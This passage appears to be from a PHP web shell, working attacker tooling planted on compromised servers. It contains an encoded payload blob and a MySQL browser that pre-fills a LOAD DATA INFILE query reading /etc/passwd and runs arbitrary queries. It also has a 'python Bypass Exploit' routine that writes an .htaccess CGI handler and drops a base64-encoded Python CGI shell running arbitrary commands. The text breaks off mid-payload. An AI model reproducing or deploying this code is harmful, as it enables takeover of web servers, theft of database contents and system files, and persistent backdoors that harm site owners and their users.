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'))); ?></textarea>
</td>
</tr>
<tr>
<td>
<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitcmd" />
</td>
</tr>
</table>
</form>
<?php
}
elseif(isset($_GET['x']) && ($_GET['x'] == 'mysql')){if(isset($_GET['sqlhost']) && isset($_GET['sqluser']) && isset($_GET['sqlpass']) && isset($_GET['sqlport'])){$sqlhost = $_GET['sqlhost'];$sqluser = $_GET['sqluser'];$sqlpass = $_GET['sqlpass'];$sqlport = $_GET['sqlport'];if($con = @mysql_connect($sqlhost.":".$sqlport,$sqluser,$sqlpass)){$msg .= "<div style='width:99%;padding:4px 10px 0 10px;'>";$msg .= "<p>Connected to ".$sqluser."<span class='gaya'>@</span>".$sqlhost.":".$sqlport;$msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;'>[ databases ]</a>";
if(isset($_GET['db'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."'>".htmlspecialchars($_GET['db'])."</a>";
if(isset($_GET['table'])) $msg .= "&nbsp;&nbsp;<span class='gaya'>-&gt;</span>&nbsp;&nbsp;<a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$_GET['db']."&amp;table=".$_GET['table']."'>".htmlspecialchars($_GET['table'])."</a>";$msg .= "</p><p>version : ".mysql_get_server_info($con)." proto ".mysql_get_proto_info($con)."</p>";$msg .= "</div>";echo $msg;
if(isset($_GET['db']) && (!isset($_GET['table'])) && (!isset($_GET['sqlquery']))){$db = $_GET['db'];$query = "DROP TABLE IF EXISTS 43RUL_table;\nCREATE TABLE `43RUL_table` ( `file` LONGBLOB NOT NULL );\nLOAD DATA INFILE '/etc/passwd'\nINTO TABLE 43RUL_table;SELECT * FROM 43RUL_table;\nDROP TABLE IF EXISTS 43RUL_table;";$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'><input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>$query</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";$tables = array();$msg .= "<table class='explore' style='width:99%;'><tr><th>available tables on ".$db."</th></tr>";$hasil = @mysql_list_tables($db,$con);
while(list($table) = @mysql_fetch_row($hasil)){@array_push($tables,$table);} @sort($tables);
foreach($tables as $table){$msg .= "<tr><td><a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."&amp;table=".$table."'>$table</a></td></tr>";} $msg .= "</table>";}
elseif(isset($_GET['table']) && (!isset($_GET['sqlquery']))){
$db = $_GET['db'];$table = $_GET['table'];$query = "SELECT * FROM ".$db.".".$table." LIMIT 0,100;";
$msgq = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";
$columns = array();$msg = "<table class='explore' style='width:99%;'>";$hasil = @mysql_query("SHOW FIELDS FROM ".$db.".".$table);while(list($column) = @mysql_fetch_row($hasil)){
$msg .= "<th>$column</th>";$kolum = $column;}$msg .= "</tr>";$hasil = @mysql_query("SELECT count(*) FROM ".$db.".".$table);
list($total) = mysql_fetch_row($hasil);
if(isset($_GET['z'])) $page = (int) $_GET['z'];
else $page = 1;$pagenum = 100;$totpage = ceil($total / $pagenum);$start = (($page - 1) * $pagenum);$hasil = @mysql_query("SELECT * FROM ".$db.".".$table." LIMIT ".$start.",".$pagenum);
while($datas = @mysql_fetch_assoc($hasil)){$msg .= "<tr>";foreach($datas as $data){if(trim($data) == "")
$data = "&nbsp;";$msg .= "<td>$data</td>";}$msg .= "</tr>";} $msg .= "</table>";$head = "<div style='padding:10px 0 0 6px;'> <form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <input type='hidden' name='table' value='".$table."' /> Page <select class='inputz' name='z' onchange='this.form.submit();'>";
for($i = 1;$i <= $totpage;$i++){$head .= "<option value='".$i."'>".$i."</option>";
if($i == $_GET['z']) $head .= "<option value='".$i."' selected='selected'>".$i."</option>";} $head .= "</select><noscript><input class='inputzbut' type='submit' value='Go !' /></noscript></form></div>";$msg = $msgq.$head.$msg;}
elseif(isset($_GET['submitquery']) && ($_GET['sqlquery'] != "")){$db = $_GET['db'];$query = magicboom($_GET['sqlquery']);
$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /> <input type='hidden' name='x' value='mysql' /> <input type='hidden' name='sqlhost' value='".$sqlhost."' /> <input type='hidden' name='sqluser' value='".$sqluser."' /> <input type='hidden' name='sqlport' value='".$sqlport."' /> <input type='hidden' name='sqlpass' value='".$sqlpass."' /> <input type='hidden' name='db' value='".$db."' /> <p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p> <p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p> </form></div> ";
@mysql_select_db($db);$querys = explode(";",$query);
foreach($querys as $query){if(trim($query) != ""){$hasil = mysql_query($query);
if($hasil){$msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> ok <span class='gaya'>]</span></p>";$msg .= "<table class='explore' style='width:99%;'><tr>";
for($i=0;$i<@mysql_num_fields($hasil);$i++)
$msg .= "<th>".htmlspecialchars(@mysql_field_name($hasil,$i))."</th>";$msg .= "</tr>";
for($i=0;$i<@mysql_num_rows($hasil);$i++)
{$rows=@mysql_fetch_array($hasil);$msg .= "<tr>";
for($j=0;$j<@mysql_num_fields($hasil);$j++) {
if($rows[$j] == "") $dataz = "&nbsp;";
else $dataz = $rows[$j];$msg .= "<td>".$dataz."</td>";} $msg .= "</tr>";} $msg .= "</table>";}
else $msg .= "<p style='padding:0;margin:20px 6px 0 6px;'>".$query.";&nbsp;&nbsp;&nbsp;<span class='gaya'>[</span> error <span class='gaya'>]</span></p>";} } }
else {$query = "SHOW PROCESSLIST;\nSHOW VARIABLES;\nSHOW STATUS;";$msg = "<div style='width:99%;padding:0 10px;'><form action='?' method='get'> <input type='hidden' name='y' value='".$pwd."' /><input type='hidden' name='x' value='mysql' /><input type='hidden' name='sqlhost' value='".$sqlhost."' /><input type='hidden' name='sqluser' value='".$sqluser."' /><input type='hidden' name='sqlport' value='".$sqlport."' /><input type='hidden' name='sqlpass' value='".$sqlpass."' /><input type='hidden' name='db' value='".$db."' /><p><textarea name='sqlquery' class='output' style='width:98%;height:80px;'>".$query."</textarea></p><p><input class='inputzbut' style='width:80px;' name='submitquery' type='submit' value='Go !' /></p></form></div> ";$dbs = array();$msg .= "<table class='explore' style='width:99%;'><tr><th>available databases</th></tr>";$hasil = @mysql_list_dbs($con);
while(list($db) = @mysql_fetch_row($hasil)){@array_push($dbs,$db);} @sort($dbs);foreach($dbs as $db){
$msg .= "<tr><td><a href='?y=".$pwd."&amp;x=mysql&amp;sqlhost=".$sqlhost."&amp;sqluser=".$sqluser."&amp;sqlpass=".$sqlpass."&amp;sqlport=".$sqlport."&amp;db=".$db."'>$db</a></td></tr>";} $msg .= "</table>";}
@mysql_close($con);} else $msg = "<p style='text-align:center;'>can't connect</p>";echo $msg;} else{?>
<form action="?" method="get"><input type="hidden" name="y" value="<?php echo $pwd;?>" /> <input type="hidden" name="x" value="mysql" /><br><br><br><table class="tabnet" style="width:300px;"> <tr><th colspan="2">MySQL Connect</th></tr> <tr><td>&nbsp;&nbsp;Host</td><td><input style="width:220px;" class="inputz" type="text" name="sqlhost" value="localhost" /></td></tr> <tr><td>&nbsp;&nbsp;Username</td><td><input style="width:220px;" class="inputz" type="text" name="sqluser" value="root" /></td></tr> <tr><td>&nbsp;&nbsp;Password</td><td><input style="width:220px;" class="inputz" type="text" name="sqlpass" value="password" /></td></tr> <tr><td>&nbsp;&nbsp;Port</td><td><input style="width:80px;" class="inputz" type="text" name="sqlport" value="3306" />&nbsp;<input style="width:19%;" class="inputzbut" type="submit" value="Go !" name="submitsql" /></td></tr></table></form>
<?php }}
elseif(isset($_GET['x']) && ($_GET['x'] == 'python')) { echo "<center/><br/><b>
+--==[ python  Bypass Exploit ]==--+
</b><br><br>";
mkdir('python', 0755);
chdir('python');
$kokdosya = ".htaccess";
$dosya_adi = "$kokdosya";
$dosya = fopen ($dosya_adi , 'w') or die ("Dosya a&#231;&#305;lamad&#305;!");
$metin = "AddHandler cgi-script .izo";
fwrite ( $dosya , $metin ) ;
fclose ($dosya);
$pythonp = 'IyEvdXNyL2Jpbi9weXRob24KIyAwNy0wNy0wNAojIHYxLjAuMAoKIyBjZ2ktc2hlbGwucHkKIyBB
IHNpbXBsZSBDR0kgdGhhdCBleGVjdXRlcyBhcmJpdHJhcnkgc2hlbGwgY29tbWFuZHMuCgoKIyBD
b3B5cmlnaHQgTWljaGFlbCBGb29yZAojIFlvdSBhcmUgZnJlZSB0byBtb2RpZnksIHVzZSBhbmQg
cmVsaWNlbnNlIHRoaXMgY29kZS4KCiMgTm8gd2FycmFudHkgZXhwcmVzcyBvciBpbXBsaWVkIGZv
ciB0aGUgYWNjdXJhY3ksIGZpdG5lc3MgdG8gcHVycG9zZSBvciBvdGhlcndpc2UgZm9yIHRoaXMg
Y29kZS4uLi4KIyBVc2UgYXQgeW91ciBvd24gcmlzayAhISEKCiMgRS1tYWlsIG1pY2hhZWwgQVQg
Zm9vcmQgRE9UIG1lIERPVCB1awojIE1haW50YWluZWQgYXQgd3d3LnZvaWRzcGFjZS5vcmcudWsv
YXRsYW50aWJvdHMvcHl0aG9udXRpbHMuaHRtbAoKIiIiCkEgc2ltcGxlIENHSSBzY3JpcHQgdG8g
ZXhlY3V0ZSBzaGVsbCBjb21tYW5kcyB2aWEgQ0dJLgoiIiIKIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIEltcG9ydHMKdHJ5
OgogICAgaW1wb3J0IGNnaXRiOyBjZ2l0Yi5lbmFibGUoKQpleGNlcHQ6CiAgICBwYXNzCmltcG9y
dCBzeXMsIGNnaSwgb3MKc3lzLnN0ZGVyciA9IHN5cy5zdGRvdXQKZnJvbSB0aW1lIGltcG9ydCBz
dHJmdGltZQppbXBvcnQgdHJhY2ViYWNrCmZyb20gU3RyaW5nSU8gaW1wb3J0IFN0cmluZ0lPCmZy
b20gdHJhY2ViYWNrIGltcG9ydCBwcmludF9leGMKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBjb25zdGFudHMKCmZvbnRs
aW5lID0gJzxGT05UIENPTE9SPSM0MjQyNDIgc3R5bGU9ImZvbnQtZmFtaWx5OnRpbWVzO2ZvbnQt
c2l6ZToxMnB0OyI+Jwp2ZXJzaW9uc3RyaW5nID0gJ1ZlcnNpb24gMS4wLjAgN3RoIEp1bHkgMjAw
NCcKCmlmIG9zLmVudmlyb24uaGFzX2tleSgiU0NSSVBUX05BTUUiKToKICAgIHNjcmlwdG5hbWUg
PSBvcy5lbnZpcm9uWyJTQ1JJUFRfTkFNRSJdCmVsc2U6CiAgICBzY3JpcHRuYW1lID0gIiIKCk1F
VEhPRCA9ICciUE9TVCInCgojIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCiMgUHJpdmF0ZSBmdW5jdGlvbnMgYW5kIHZhcmlhYmxl
cwoKZGVmIGdldGZvcm0odmFsdWVsaXN0LCB0aGVmb3JtLCBub3RwcmVzZW50PScnKToKICAgICIi
IlRoaXMgZnVuY3Rpb24sIGdpdmVuIGEgQ0dJIGZvcm0sIGV4dHJhY3RzIHRoZSBkYXRhIGZyb20g
aXQsIGJhc2VkIG9uCiAgICB2YWx1ZWxpc3QgcGFzc2VkIGluLiBBbnkgbm9uLXByZXNlbnQgdmFs
dWVzIGFyZSBzZXQgdG8gJycgLSBhbHRob3VnaCB0aGlzIGNhbiBiZSBjaGFuZ2VkLgogICAgKGUu
Zy4gdG8gcmV0dXJuIE5vbmUgc28geW91IGNhbiB0ZXN0IGZvciBtaXNzaW5nIGtleXdvcmRzIC0g
d2hlcmUgJycgaXMgYSB2YWxpZCBhbnN3ZXIgYnV0IHRvIGhhdmUgdGhlIGZpZWxkIG1pc3Npbmcg
aXNuJ3QuKSIiIgogICAgZGF0YSA9IHt9CiAgICBmb3IgZmllbGQgaW4gdmFsdWVsaXN0OgogICAg
ICAgIGlmIG5vdCB0aGVmb3JtLmhhc19rZXkoZmllbGQpOgogICAgICAgICAgICBkYXRhW2ZpZWxk
XSA9IG5vdHByZXNlbnQKICAgICAgICBlbHNlOgogICAgICAgICAgICBpZiAgdHlwZSh0aGVmb3Jt
W2ZpZWxkXSkgIT0gdHlwZShbXSk6CiAgICAgICAgICAgICAgICBkYXRhW2ZpZWxkXSA9IHRoZWZv
cm1bZmllbGRdLnZhbHVlCiAgICAgICAgICAgIGVsc2U6CiAgICAgICAgICAgICAgICB2YWx1ZXMg
PSBtYXAobGFtYmRhIHg6IHgudmFsdWUsIHRoZWZvcm1bZmllbGRdKSAgICAgIyBhbGxvd3MgZm9y
IGxpc3QgdHlwZSB2YWx1ZXMKICAgICAgICAgICAgICAgIGRhdGFbZmllbGRdID0gdmFsdWVzCiAg
ICByZXR1cm4gZGF0YQoKCnRoZWZvcm1oZWFkID0gIiIiPEhUTUw+PEhFQUQ+PFRJVExFPmNnaS1z
aGVsbC5weSAtIGEgQ0dJIGJ5IEZ1enp5bWFuPC9USVRMRT48L0hFQUQ+CjxCT0RZPjxDRU5URVI+
CjxIMT5XZWxjb21lIHRvIGNnaS1zaGVsbC5weSAtIDxCUj5hIFB5dGhvbiBDR0k8L0gxPgo8Qj48
ST5CeSBGdXp6eW1hbjwvQj48L0k+PEJSPgoiIiIrZm9udGxpbmUgKyJWZXJzaW9uIDogIiArIHZl
cnNpb25zdHJpbmcgKyAiIiIsIFJ1bm5pbmcgb24gOiAiIiIgKyBzdHJmdGltZSgnJUk6JU0gJXAs
ICVBICVkICVCLCAlWScpKycuPC9DRU5URVI+PEJSPicKCnRoZWZvcm0gPSAiIiI8SDI+RW50ZXIg
Q29tbWFuZDwvSDI+CjxGT1JNIE1FVEhPRD1cIiIiIiArIE1FVEhPRCArICciIGFjdGlvbj0iJyAr
IHNjcmlwdG5hbWUgKyAiIiJcIj4KPGlucHV0IG5hbWU9Y21kIHR5cGU9dGV4dD48QlI+CjxpbnB1
dCB0eXBlPXN1Ym1pdCB2YWx1ZT0iU3VibWl0Ij48QlI+CjwvRk9STT48QlI+PEJSPiIiIgpib2R5
ZW5kID0gJzwvQk9EWT48L0hUTUw+JwplcnJvcm1lc3MgPSAnPENFTlRFUj48SDI+U29tZXRoaW5n
IFdlbnQgV3Jvbmc8L0gyPjxCUj48UFJFPicKCiMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj
IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMKIyBtYWluIGJvZHkgb2YgdGhlIHNj
cmlwdAoKaWYgX19uYW1lX18gPT0gJ19fbWFpbl9fJzoKICAgIHByaW50ICJDb250ZW50LXR5cGU6
IHRleHQvaHRtbCIgICAgICAgICAjIHRoaXMgaXMgdGhlIGhlYWRlciB0byB0aGUgc2VydmVyCiAg
ICBwcmludCAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIyBzbyBpcyB0aGlzIGJs
YW5rIGxpbmUKICAgIGZvcm0gPSBjZ2kuRmllbGRTdG9yYWdlKCkKICAgIGRhdGEgPSBnZXRmb3Jt
KFsnY21kJ10sZm9ybSkKICAgIHRoZWNtZCA9IGRhdGFbJ2NtZCddCiAgICBwcmludCB0aGVmb3Jt
aGVhZAogICAgcHJpbnQgdGhlZm9ybQogICAgaWYgdGhlY21kOgogICAgICAgIHByaW50ICc8SFI+
PEJSPjxCUj4nCiAgICAgICAgcHJpbnQgJzxCPkNvbW1hbmQgOiAnLCB0aGVjbWQsICc8QlI+PEJS
PicKICAgICAgICBwcmludCAnUmVzdWx0IDogPEJSPjxCUj4nCiAgICAgICAgdHJ5OgogICAgICAg
ICAgICBjaGlsZF9zdGRpbiwgY2hpbGRfc3Rkb3V0ID0gb3MucG9wZW4yKHRoZWNtZCkKICAgICAg
